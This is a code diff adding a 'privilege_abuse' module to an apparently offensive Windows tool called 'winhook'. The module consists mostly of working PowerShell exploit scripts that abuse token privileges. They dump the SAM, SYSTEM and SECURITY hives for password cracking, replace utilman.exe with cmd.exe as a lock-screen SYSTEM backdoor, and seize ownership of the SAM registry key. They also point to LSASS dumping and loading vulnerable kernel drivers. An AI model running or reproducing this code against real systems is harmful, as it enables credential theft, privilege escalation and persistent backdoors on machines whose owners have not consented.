@@ -402,6 +402,10 @@ const PROGRAMS = {
       "Advanced LSASS memory dumping with EDR bypass — multiple techniques to dump LSASS while evading endpoint detection. Fork: clone LSASS via NtCreateProcessEx and dump the clone. Snapshot: PssCreateSnapshot API. SSP: inject custom Security Package via AddSecurityPackage to intercept credentials. Seclogon: leak LSASS handle via Secondary Logon service. Each method bypasses different EDR hooks",
     args: "--method <fork|snapshot|ssp|seclogon> [--outfile PATH]",
   },
+privilege_abuse: {
+    description: "Enumerate and exploit dangerous Windows token privileges — SeBackupPrivilege (read any file including SAM/NTDS.dit via robocopy /b), SeRestorePrivilege (write anywhere, replace utilman.exe), SeTakeOwnershipPrivilege (take ownership of any object), SeLoadDriverPrivilege (load vulnerable kernel driver), SeDebugPrivilege (inject into any process), SeManageVolumePrivilege (raw disk read), SeAssignPrimaryTokenPrivilege (create process with another token), SeImpersonatePrivilege (token theft for SYSTEM)",
+    args: "--action enum|exploit --privilege PRIVILEGE_NAME [--target PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -13635,6 +13639,328 @@ if ($hLsass -ne [IntPtr]::Zero) {
 
 // ── Dispatch ──
 
+async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const privilege = argVal(args, "--privilege")
+  const target = argVal(args, "--target")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Token Privilege abuse analysis...\n"]
+
+  if (action === "enum") {
+    const script = `
+# Enumerate current privileges and flag abusable ones
+$privOutput = whoami /priv 2>&1
+Write-Output "=== Current Token Privileges ===`n"
+Write-Output $privOutput
+
+$abusablePrivs = @{
+    'SeImpersonatePrivilege' = @{
+        Risk = 'CRITICAL'
+        Abuse = 'Token impersonation -> SYSTEM (Potato attacks, named pipe impersonation)'
+        Command = 'winhook potato_attack --method sweet'
+    }
+    'SeAssignPrimaryTokenPrivilege' = @{
+        Risk = 'CRITICAL'
+        Abuse = 'Create process with stolen/forged token as any user'
+        Command = 'winhook token_impersonate --action exploit'
+    }
+    'SeDebugPrivilege' = @{
+        Risk = 'CRITICAL'
+        Abuse = 'Open any process (incl. SYSTEM), inject code, dump LSASS'
+        Command = 'winhook privilege_abuse --privilege SeDebugPrivilege --target lsass'
+    }
+    'SeBackupPrivilege' = @{
+        Risk = 'HIGH'
+        Abuse = 'Read any file regardless of ACL — SAM/SYSTEM hives, NTDS.dit, shadow copies'
+        Command = 'winhook privilege_abuse --privilege SeBackupPrivilege --target SAM'
+    }
+    'SeRestorePrivilege' = @{
+        Risk = 'HIGH'
+        Abuse = 'Write to any file regardless of ACL — replace utilman.exe, sethc.exe for sticky keys backdoor'
+        Command = 'winhook privilege_abuse --privilege SeRestorePrivilege --target utilman'
+    }
+    'SeTakeOwnershipPrivilege' = @{
+        Risk = 'HIGH'
+        Abuse = 'Take ownership of any securable object (files, registry, services, AD objects)'
+        Command = 'winhook privilege_abuse --privilege SeTakeOwnershipPrivilege --target "C:\path"'
+    }
+    'SeLoadDriverPrivilege' = @{
+        Risk = 'HIGH'
+        Abuse = 'Load kernel drivers — use Capcom.sys or other vuln drivers for kernel code exec'
+        Command = 'winhook privilege_abuse --privilege SeLoadDriverPrivilege'
+    }
+    'SeManageVolumePrivilege' = @{
+        Risk = 'MEDIUM'
+        Abuse = 'Raw disk read/write — bypass file-level ACLs, read deleted files'
+        Command = 'winhook privilege_abuse --privilege SeManageVolumePrivilege'
+    }
+    'SeCreateTokenPrivilege' = @{
+        Risk = 'CRITICAL'
+        Abuse = 'Create arbitrary tokens with any groups/privileges'
+        Command = 'N/A (very rare, usually only Local System)'
+    }
+    'SeTcbPrivilege' = @{
+        Risk = 'CRITICAL'
+        Abuse = 'Act as part of the operating system — create logon sessions with arbitrary SIDs'
+        Command = 'N/A (very rare, usually only Local System)'
+    }
+}
+
+Write-Output ""
+Write-Output "=== Abusable Privileges Analysis ===`n"
+
+$enabled = @()
+$disabled = @()
+
+foreach ($priv in $abusablePrivs.Keys) {
+    if ($privOutput -match "$priv\s+.*Enabled") {
+        $enabled += $priv
+        $info = $abusablePrivs[$priv]
+        Write-Output "[!] $($info.Risk) — $priv [ENABLED]"
+        Write-Output "    Abuse: $($info.Abuse)"
+        Write-Output "    Run:   $($info.Command)"
+        Write-Output ""
+    } elseif ($privOutput -match $priv) {
+        $disabled += $priv
+        $info = $abusablePrivs[$priv]
+        Write-Output "[*] $($info.Risk) — $priv [DISABLED — can be enabled]"
+        Write-Output "    Abuse: $($info.Abuse)"
+        Write-Output ""
+    }
+}
+
+Write-Output "=== Summary ==="
+Write-Output "[+] Enabled abusable privileges: $($enabled.Count)"
+Write-Output "[*] Disabled (enableable): $($disabled.Count)"
+if ($enabled.Count -gt 0) { Write-Output "[!] Immediate escalation possible via: $($enabled -join ', ')" }
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const enabledMatch = result.stdout.match(/Enabled abusable privileges: (\d+)/)
+    const enabledCount = enabledMatch ? parseInt(enabledMatch[1]) : 0
+
+    if (enabledCount > 0) {
+      findings.push({
+        checkId: "WIN-PRIVESC-PRIV-001",
+        provider: "windows",
+        severity: "critical",
+        status: "VULNERABLE",
+        resource: "token://privileges",
+        title: `${enabledCount} abusable privilege(s) enabled on current token`,
+        details: result.stdout.substring(0, 500),
+        remediation: "Remove unnecessary privileges from user/service accounts. Apply least privilege principle.",
+      })
+    }
+  } else if (action === "exploit" && privilege) {
+    const exploits: Record<string, string> = {
+      SeBackupPrivilege: `
+Write-Output "[*] Exploiting SeBackupPrivilege — reading protected files..."
+
+# Enable the privilege
+$adjuster = @"
+using System;
+using System.Runtime.InteropServices;
+public class TokenPriv {
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool AdjustTokenPrivileges(IntPtr token, bool disableAll, ref TOKEN_PRIVILEGES newState, uint bufLen, IntPtr prev, IntPtr retLen);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool OpenProcessToken(IntPtr process, uint access, out IntPtr token);
+    [DllImport("advapi32.dll", SetLastError=true)]
+    public static extern bool LookupPrivilegeValue(string host, string name, out LUID luid);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetCurrentProcess();
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TOKEN_PRIVILEGES { public uint Count; public LUID Luid; public uint Attributes; }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct LUID { public uint Low; public int High; }
+
+    public static bool EnablePrivilege(string priv) {
+        IntPtr token;
+        if (!OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, out token)) return false;
+        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
+        tp.Count = 1;
+        tp.Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED
+        if (!LookupPrivilegeValue(null, priv, out tp.Luid)) return false;
+        return AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+    }
+}
+"@
+Add-Type -TypeDefinition $adjuster
+
+[TokenPriv]::EnablePrivilege("SeBackupPrivilege") | Out-Null
+Write-Output "[+] SeBackupPrivilege enabled"
+
+# Read SAM and SYSTEM hives using backup intent
+$outDir = "C:\\Windows\\Temp\\cs-backup-$([guid]::NewGuid().ToString('N').Substring(0,6))"
+New-Item -ItemType Directory -Path $outDir -Force | Out-Null
+
+# reg save with backup privilege
+reg save HKLM\\SAM "$outDir\\SAM" /y 2>$null | Out-Null
+reg save HKLM\\SYSTEM "$outDir\\SYSTEM" /y 2>$null | Out-Null
+reg save HKLM\\SECURITY "$outDir\\SECURITY" /y 2>$null | Out-Null
+
+if (Test-Path "$outDir\\SAM") {
+    Write-Output "[+] SAM hive saved: $outDir\\SAM"
+    Write-Output "[+] SYSTEM hive saved: $outDir\\SYSTEM"
+    Write-Output "[+] SECURITY hive saved: $outDir\\SECURITY"
+    Write-Output "[*] Crack with: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
+} else {
+    # Try robocopy with backup flag
+    Write-Output "[*] reg save failed, trying robocopy /b..."
+    robocopy "$env:SystemRoot\\System32\\config" $outDir SAM SYSTEM SECURITY /b /copyall /np 2>$null
+    if (Test-Path "$outDir\\SAM") {
+        Write-Output "[+] Files copied via robocopy /b"
+    } else {
+        Write-Output "[-] Could not copy hives even with backup privilege"
+    }
+}
+`,
+      SeRestorePrivilege: `
+Write-Output "[*] Exploiting SeRestorePrivilege — writing to protected locations..."
+Write-Output "[*] Target: utilman.exe -> cmd.exe (sticky keys backdoor)"
+Write-Output ""
+Write-Output "[!] This replaces utilman.exe with cmd.exe"
+Write-Output "[!] At lock screen: Win+U opens cmd as SYSTEM"
+Write-Output ""
+
+# Backup utilman first
+$utilman = "$env:SystemRoot\\System32\\utilman.exe"
+$backup = "$env:SystemRoot\\System32\\utilman.exe.bak"
+$cmd = "$env:SystemRoot\\System32\\cmd.exe"
+
+if (-not (Test-Path $backup)) {
+    Copy-Item $utilman $backup -Force -ErrorAction SilentlyContinue
+    Write-Output "[+] Backed up: utilman.exe -> utilman.exe.bak"
+}
+
+Copy-Item $cmd $utilman -Force -ErrorAction SilentlyContinue
+if ((Get-FileHash $utilman).Hash -eq (Get-FileHash $cmd).Hash) {
+    Write-Output "[+] utilman.exe replaced with cmd.exe"
+    Write-Output "[+] At lock screen, press Win+U for SYSTEM shell"
+    Write-Output "[*] Restore: Copy-Item '$backup' '$utilman' -Force"
+} else {
+    Write-Output "[-] Failed to replace utilman.exe"
+    Write-Output "[*] Alternative: try sethc.exe (5x Shift at lock screen)"
+}
+`,
+      SeTakeOwnershipPrivilege: `
+$targetPath = "${target || "HKLM:\\SAM\\SAM"}"
+Write-Output "[*] Exploiting SeTakeOwnershipPrivilege on: $targetPath"
+
+if ($targetPath -match '^HKLM') {
+    # Registry key ownership
+    try {
+        $key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($targetPath.Replace('HKLM:\\',''), [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::TakeOwnership)
+        if ($key) {
+            $acl = $key.GetAccessControl()
+            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().User
+            $acl.SetOwner($currentUser)
+            $key.SetAccessControl($acl)
+            Write-Output "[+] Ownership taken on $targetPath"
+
+            # Now grant ourselves full control
+            $rule = New-Object System.Security.AccessControl.RegistryAccessRule($currentUser, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
+            $acl.AddAccessRule($rule)
+            $key.SetAccessControl($acl)
+            Write-Output "[+] Full control granted"
+        }
+    } catch {
+        Write-Output "[-] Failed: $_"
+    }
+} else {
+    # File/folder ownership
+    try {
+        takeown /f "$targetPath" /a 2>&1 | Out-Null
+        icacls "$targetPath" /grant "$env:USERNAME:F" 2>&1 | Out-Null
+        Write-Output "[+] Ownership taken and full control granted on $targetPath"
+    } catch {
+        Write-Output "[-] Failed: $_"
+    }
+}
+`,
+      SeDebugPrivilege: `
+Write-Output "[*] Exploiting SeDebugPrivilege — accessing SYSTEM processes..."
+Write-Output "[*] This privilege allows opening any process including LSASS"
+Write-Output ""
+
+# Dump LSASS via MiniDump (SeDebugPrivilege allows opening the handle)
+$lsass = Get-Process lsass -ErrorAction SilentlyContinue
+if ($lsass) {
+    Write-Output "[+] LSASS PID: $($lsass.Id)"
+    Write-Output "[*] Use: winhook lsass_dump (SeDebugPrivilege enables handle access)"
+    Write-Output "[*] Or:  winhook nanodump_advanced --method fork"
+} else {
+    Write-Output "[-] Cannot find LSASS process"
+}
+
+# List SYSTEM processes we can now access
+Write-Output ""
+Write-Output "=== SYSTEM Processes (accessible via SeDebugPrivilege) ==="
+$systemProcs = Get-Process -IncludeUserName -ErrorAction SilentlyContinue | Where-Object { $_.UserName -match 'SYSTEM' } | Select-Object -First 20
+foreach ($p in $systemProcs) {
+    Write-Output "    PID $($p.Id): $($p.ProcessName) ($($p.UserName))"
+}
+Write-Output ""
+Write-Output "[*] Can migrate into any SYSTEM process for privilege escalation"
+Write-Output "[*] Can also inject shellcode into SYSTEM processes"
+`,
+      SeLoadDriverPrivilege: `
+Write-Output "[*] SeLoadDriverPrivilege — can load kernel drivers"
+Write-Output ""
+Write-Output "[!] Exploitation vectors:"
+Write-Output "    1. Load Capcom.sys — execute arbitrary code in kernel mode"
+Write-Output "    2. Load ProcExp152.sys — bypass PPL on LSASS"
+Write-Output "    3. Load RTCore64.sys — arbitrary kernel memory R/W"
+Write-Output ""
+Write-Output "[*] Steps:"
+Write-Output "    1. Place driver at C:\\Windows\\Temp\\vuln.sys"
+Write-Output "    2. Register: sc.exe create VulnDrv type=kernel binpath=C:\\Windows\\Temp\\vuln.sys"
+Write-Output "    3. Load: sc.exe start VulnDrv"
+Write-Output "    4. Exploit driver's vulnerable IOCTL"
+Write-Output ""
+Write-Output "[*] Use 'winhook byovd --action enum' to find available vulnerable drivers"
+
+# Check if any known vulnerable drivers are already loaded
+$drivers = Get-CimInstance Win32_SystemDriver -ErrorAction SilentlyContinue
+$knownVuln = @('Capcom', 'RTCore64', 'DBUtil', 'gdrv', 'iqvw64e', 'ProcExp')
+foreach ($d in $drivers) {
+    foreach ($v in $knownVuln) {
+        if ($d.Name -match $v) {
+            Write-Output "[!] Vulnerable driver already loaded: $($d.Name) ($($d.PathName))"
+        }
+    }
+}
+`,
+    }
+
+    const exploitScript = exploits[privilege]
+    if (!exploitScript) {
+      output.push(`[!] Unknown privilege: ${privilege}`)
+      output.push("[*] Supported: SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeLoadDriverPrivilege")
+      return { output: output.join("\n"), findings }
+    }
+
+    const result = await ps(exploitScript, timeout)
+    output.push(result.stdout)
+    if (result.stderr) output.push(`[!] ${result.stderr.substring(0, 200)}`)
+
+    findings.push({
+      checkId: "WIN-PRIVESC-PRIV-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXPLOITED",
+      resource: `privilege://${privilege}`,
+      title: `${privilege} exploited for privilege escalation`,
+      details: result.stdout.substring(0, 300),
+      remediation: `Remove ${privilege} from user/service account. Apply least privilege.`,
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -13716,6 +14042,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   rbcd_chain: rbcdChain,
   remote_monologue: remoteMonologue,
   nanodump_advanced: nanodumpAdvanced,
+  privilege_abuse: privilegeAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
